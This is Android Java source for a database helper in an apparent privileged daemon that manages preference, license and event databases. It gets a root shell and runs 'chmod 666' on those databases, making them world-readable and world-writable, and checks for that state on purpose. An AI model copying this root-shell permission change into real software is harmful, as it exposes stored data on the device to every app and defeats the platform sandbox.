package com.fx.database;

import java.util.ArrayList;

import android.content.Context;
import android.os.SystemClock;

import com.fx.eventdb.EventDatabaseManager;
import com.fx.eventdb.EventDatabaseMetadata;
import com.fx.license.LicenseDatabaseMetadata;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.preference.PreferenceDatabaseMetadata;
import com.fx.preference.PreferenceManager;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;

public class FxDatabaseHelper {
	
	private static final String TAG = "FxDatabaseHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String[] DATABASE_FILES_LIST = { 
		PreferenceDatabaseMetadata.DB_NAME, 
		LicenseDatabaseMetadata.DB_NAME, 
		EventDatabaseMetadata.DB_NAME
	};
	
	public synchronized static void initDatabases(Context context) {
		if (LOGV) FxLog.v(TAG, "initDatabases # ENTER ...");
		
		if (isEveryDatabaseInitialized()) {
			return;
		}
		
		trySetupDatabase(context);
		
		int count = 0;
		while (!isEveryDatabaseInitialized() && count++ < 5) {
			trySetupDatabase(context);
			SystemClock.sleep(3000);
		}
		
		if (LOGV) FxLog.v(TAG, "initDatabases # EXIT ...");
	}
	
	/**
	 * Make databases accessible from GUI. 
	 */
	public synchronized static void changeDatabasePermission(Context context) {
		if (LOGV) FxLog.v(TAG, "changeDatabasePermission # Enter ..");
		
		try {
			Shell shell = Shell.getRootShell();
			for (String dbFileName : DATABASE_FILES_LIST) {
				shell.exec(String.format("chmod 666 %s/%s*", 
						MainDaemonResource.EXTRACTING_PATH, dbFileName));
			}
			shell.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(TAG, String.format(
					"changeDatabasePermission # error: %s", e.getMessage()), e); 
		}
		
		if (LOGV) FxLog.v(TAG, "changeDatabasePermission # Exit ..");
	}
	
	public synchronized static boolean isEveryDatabaseInitialized() {
		if (LOGV) FxLog.v(TAG, "isEveryDatabaseInitialized # ENTER ...");
		
		ArrayList<LinuxFile> list = LinuxFile.getFileList(MainDaemonResource.EXTRACTING_PATH);
		
		if (list.isEmpty()) {
			if (LOGV) FxLog.v(TAG, "isEveryDatabaseInitialized # Path not found -> EXIT");
			return false;
		}
		
		for (String dbFileName : DATABASE_FILES_LIST) {
			boolean isDbFileExisted = false;
			boolean isDbFileWritable = false;
			
			for (LinuxFile f : list) {
				if (f.getType() == LinuxFile.Type.FILE && dbFileName.equals(f.getName())) {
					isDbFileExisted = true;
					isDbFileWritable = f.canAnyoneWrite();
				}
			}
			
			if (LOGV) FxLog.v(TAG, String.format(
					"isEveryDatabaseInitialized # Is %s existed? %s, writable? %s", 
					dbFileName, isDbFileExisted, isDbFileWritable));
			
			if (!isDbFileExisted || !isDbFileWritable) {
				if (LOGV) FxLog.v(TAG, "isEveryDatabaseInitialized # db are not ready -> EXIT");
				return false;
			}
		}
		
		if (LOGV) FxLog.v(TAG, "isEveryDatabaseInitialized # EXIT ...");
		return true;
	}
	
	public synchronized static boolean isPreferenceDatabaseExisted() {
		return isDbFileExisted(PreferenceDatabaseMetadata.DB_NAME);
	}
	
	public synchronized static boolean isLicenseDatabaseExisted() {
		return isDbFileExisted(LicenseDatabaseMetadata.DB_NAME);
	}
	
	public synchronized static boolean isEventDatabaseExisted() {
		return isDbFileExisted(EventDatabaseMetadata.DB_NAME);
	}
	
	private static boolean isDbFileExisted(String dbFileName) {
		String systemPath = String.format("%s/%s", MainDaemonResource.EXTRACTING_PATH, dbFileName);
		return ShellUtil.isFileExisted(systemPath);
	}
	
	private static void trySetupDatabase(Context context) {
		if (LOGV) FxLog.v(TAG, "trySetupDatabase # ENTER ...");
		
		if (LOGV) FxLog.v(TAG, "trySetupDatabase # Initializing database ...");
		for (String dbFileName : DATABASE_FILES_LIST) {
			if (! isDbFileExisted(dbFileName)) {
				
				if (dbFileName.equals(PreferenceDatabaseMetadata.DB_NAME)) {
					PreferenceManager.getInstance(context);
				}
				else if (dbFileName.equals(LicenseDatabaseMetadata.DB_NAME)) {
					LicenseManager.getInstance(context);
				}
				else if (dbFileName.equals(EventDatabaseMetadata.DB_NAME)) {
					EventDatabaseManager.getInstance(context);
				}
				
				if (LOGV) {
					FxLog.v(TAG, String.format(
							"trySetupDatabase # %s is newly created", dbFileName));
				}
			}
		}
		
		if (LOGV) FxLog.v(TAG, "trySetupDatabase # Changing database permission ...");
		changeDatabasePermission(context);
		
		if (LOGV) FxLog.v(TAG, "trySetupDatabase # EXIT ...");
	}
	
}
